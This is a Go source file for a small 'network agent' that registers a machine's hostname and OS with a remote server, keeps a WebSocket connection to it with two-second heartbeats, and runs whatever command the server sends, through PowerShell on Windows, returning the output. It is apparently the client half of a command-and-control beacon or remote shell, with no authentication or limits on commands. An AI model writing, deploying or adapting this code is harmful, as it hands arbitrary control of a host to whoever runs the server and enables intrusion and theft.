package main

import (
    "bytes"
    "encoding/json"
    "flag"
    "fmt"
    "hash/fnv"
    "log"
    "net/http"
    "net/url"
    "os"
    "runtime"
    "time"
    "os/exec"
    "strings"
    "context"

    "github.com/gorilla/websocket"
)

var (
    SERVER_IP *string
    hostHash  string
    PATH = "/ws/agent"
    hostname, _ = os.Hostname()

    cmdInput = make(chan string)
    cmdOutput = make(chan []byte)
    quit = make(chan bool)
)

func main() {

    SERVER_IP = flag.String("server", "", "Server IP")
    flag.Parse()

    f, err := os.OpenFile("network-agent.txt", os.O_RDWR|os.O_CREATE|os.O_APPEND, 0666)
    if err != nil {
        log.Fatalf("error opening file: %v", err)
    }
    defer f.Close()
    log.SetOutput(f)

    log.Println("Starting up...")

    hostHash = fmt.Sprint(hash(hostname))
    RegisterAgent(hostHash)

    go connect()
    select {}
}

func connect() {
    log.Println("Initializing WebSocket...")
    url := url.URL{Scheme: "ws", Host: *SERVER_IP, Path: PATH}
    conn, _, err := websocket.DefaultDialer.Dial(url.String(), nil)
    if err != nil {
        log.Println("Error:", err)
        time.Sleep(5 * time.Second)
        go connect()
        return
    }
    go readMsg(conn)
    go writeMsg(conn)
}

func readMsg(conn *websocket.Conn) {
    for {
        _, message, err := conn.ReadMessage()
        if err != nil {
            log.Println("ReadMessage() error:", err)
            quit <- true
            conn.Close()
            log.Println("Sleeping for 5 seconds...")
            time.Sleep(5 * time.Second)
            go connect()
            return
        }
        jsonData := make(map[string]interface{})
        err = json.Unmarshal(message, &jsonData)
        if err != nil {
            log.Println("Error:", err)
            continue
        }
        cmd := jsonData["cmd"].(string)
        go executeCmd(cmd)
    }
}

func writeMsg(conn *websocket.Conn) {
    input := make(chan string, 1)
    go getInput(input)
    for {
        select {
        case <-quit:
            return
        case msg := <-input:
            err := conn.WriteMessage(websocket.TextMessage, []byte(msg))
            if err != nil {
                log.Println("WriteMessage() error:", err)
                return
            }
        }
    }
}

func getInput(input chan string) {
    for {
        select {
        case <-quit:
            return
        case <-time.After(2 * time.Second):
            ping := fmt.Sprintf(`{"OpCode": 0, "ID": %s, "Status": "Alive"}`, hostHash)
            input <- ping
        case msg := <-cmdOutput:
            output := fmt.Sprintf(`{"OpCode": 1, "ID": %s, "Output": "%s"}`, hostHash, msg)
            output = strings.ReplaceAll(output, `\`, `\\`)
            input <- output
        }

    }
}

func executeCmd(cmd string) {
    log.Println("Executing command:", cmd)
    var cmdStruct *exec.Cmd
    args := strings.Split(cmd, " ")

    ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
    defer cancel()

    if runtime.GOOS == "windows" {
        cmdStruct = exec.CommandContext(ctx, "powershell.exe", args...)
    } else {
        cmdStruct = exec.CommandContext(ctx, args[0], args[1:]...)
    }

    out, err := cmdStruct.CombinedOutput()
    if err != nil {
        log.Println("Error:", err)
        return
    }

    out = []byte(strings.TrimSpace(string(out)))
    out = []byte(strings.ReplaceAll(string(out), "\r\n", "\n"))
    cmdOutput <- out
}

func RegisterAgent(hash string) {
    log.Println("Registering agent...")

    hostOS := runtime.GOOS

    host := interface{}(map[string]interface{}{
        "ID": fmt.Sprint(hash),
        "Hostname": hostname,
        "HostOS": hostOS,
    })

    jsonData, err := json.Marshal(host)
    if err != nil {
        log.Println(err)
    }

    _, err = http.Post("http://"+*SERVER_IP+"/api/agents/add", "application/json", bytes.NewBuffer(jsonData))
    if err != nil {
        log.Println(err)
    }
}

func hash(s string) uint32 {
    h := fnv.New32a()
    h.Write([]byte(s))
    return h.Sum32()
}
